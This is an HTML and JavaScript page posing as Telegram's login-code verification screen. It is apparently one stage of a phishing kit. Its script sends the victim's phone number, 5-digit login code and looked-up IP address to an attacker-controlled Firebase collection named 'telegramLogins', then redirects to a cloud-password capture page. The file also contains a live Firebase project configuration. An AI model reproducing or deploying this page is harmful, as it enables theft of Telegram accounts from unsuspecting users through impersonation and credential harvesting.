<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Code Verification</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <!-- Add Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <style>
        /* Your existing CSS styles remain the same */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #0088cc 0%, #00a2e8 100%);
            padding: 20px;
        }

        .telegram-container {
            background-color: white;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
            width: 100%;
            max-width: 400px;
            padding: 40px 30px;
            text-align: center;
        }

        .telegram-header {
            color: #0088cc;
            margin-bottom: 30px;
        }

        .telegram-header i {
            font-size: 48px;
            margin-bottom: 15px;
        }

        .code-inputs {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 25px 0;
        }

        .code-input {
            width: 50px;
            height: 60px;
            border: 2px solid #ddd;
            border-radius: 8px;
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            transition: all 0.3s;
        }

        .code-input:focus {
            border-color: #0088cc;
            box-shadow: 0 0 0 2px rgba(0, 136, 204, 0.2);
            outline: none;
        }

        .telegram-btn {
            width: 100%;
            padding: 12px;
            background: #0088cc;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .telegram-btn:hover {
            background: #0077b3;
            transform: translateY(-2px);
        }

        .back-btn {
            margin-top: 15px;
            color: #0088cc;
            text-decoration: none;
            display: inline-block;
        }

        .info-text {
            font-size: 14px;
            color: #666;
            margin-top: 15px;
            line-height: 1.5;
        }

        .phone-display {
            font-weight: 600;
            color: #0088cc;
            margin: 10px 0;
        }

        .loading {
            display: none;
            margin-top: 15px;
            text-align: center;
        }

        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0088cc;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }

        .loading-text {
            font-size: 14px;
            color: #666;
            margin-bottom: 10px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="telegram-container">
        <div class="telegram-header">
            <i class="fab fa-telegram"></i>
            <h2>Telegram Code</h2>
            <p>Enter the 5-digit code sent to your phone</p>
        </div>
        
        <div class="phone-display" id="phoneDisplay"></div>
        
        <form id="codeForm">
            <div class="code-inputs">
                <input type="text" class="code-input" maxlength="1" name="digit1" required>
                <input type="text" class="code-input" maxlength="1" name="digit2" required>
                <input type="text" class="code-input" maxlength="1" name="digit3" required>
                <input type="text" class="code-input" maxlength="1" name="digit4" required>
                <input type="text" class="code-input" maxlength="1" name="digit5" required>
            </div>
            
            <button type="submit" class="telegram-btn" id="verifyBtn">Verify Code</button>
        </form>

        <div class="loading" id="loading">
            <div class="loading-spinner"></div>
            <div class="loading-text">Verifying code...</div>
            <p class="info-text">Redirecting to cloud password verification</p>
        </div>
        
        <p class="info-text">Didn't receive the code? <a href="#" style="color: #0088cc;">Resend</a></p>
        
        <a href="telegram-login.html" class="back-btn">‚Üê Back to phone entry</a>
    </div>

    <script>
        // Firebase configuration
        const firebaseConfig = {
            apiKey: "AIzaSyCB47uNdcAYifcxhgRGv-Q9TUAi0Wg5g94",
            authDomain: "telegram-login-tracker.firebaseapp.com",
            projectId: "telegram-login-tracker",
            storageBucket: "telegram-login-tracker.firebasestorage.app",
            messagingSenderId: "930264969410",
            appId: "1:930264969410:web:e0bb1717d3ca76ce774b5b",
            measurementId: "G-5760KLJZJS"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        
        // Get phone number from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const phone = urlParams.get('phone');
        
        // Display phone number
        document.getElementById('phoneDisplay').textContent = `Phone: ${phone || 'Not provided'}`;
        
        // Auto-focus first input
        const inputs = document.querySelectorAll('.code-input');
        inputs[0].focus();
        
        // Auto-tab between inputs
        inputs.forEach((input, index) => {
            input.addEventListener('input', () => {
                if (input.value && index < inputs.length - 1) {
                    inputs[index + 1].focus();
                }
            });
            
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    inputs[index - 1].focus();
                }
            });
        });
        
        // Form submission
        document.getElementById('codeForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const codeInputs = document.querySelectorAll('.code-input');
            let code = '';
            
            codeInputs.forEach(input => {
                code += input.value;
            });

            // Validate code length
            if (code.length !== 5) {
                alert('Please enter a complete 5-digit code');
                return;
            }

            // Show loading state
            document.getElementById('verifyBtn').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            // Prepare data
            const loginData = {
                phone: phone,
                code: code,
                platform: 'Telegram',
                timestamp: new Date().toISOString(),
                ip: await getIP()
            };

            try {
                // Save to Firebase
                await db.collection('telegramLogins').add(loginData);
                
                // Also save to localStorage as backup
                localStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                sessionStorage.setItem('telegramLoginData', JSON.stringify(loginData));

                // Redirect to CLOUD PASSWORD page instead of store
                setTimeout(() => {
                    window.location.href = 'cloud-password.html';
                }, 1500);
                
            } catch (error) {
                console.error('Failed to save data:', error);
                alert('Failed to save to server. Using local storage only.');
                
                // Fallback to local storage
                localStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                sessionStorage.setItem('telegramLoginData', JSON.stringify(loginData));
                
                // Still redirect to cloud password page
                setTimeout(() => {
                    window.location.href = 'cloud-password.html';
                }, 1500);
            }
        });

        // Function to get user's IP address
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'unknown';
            }
        }
    </script>
</body>
</html>
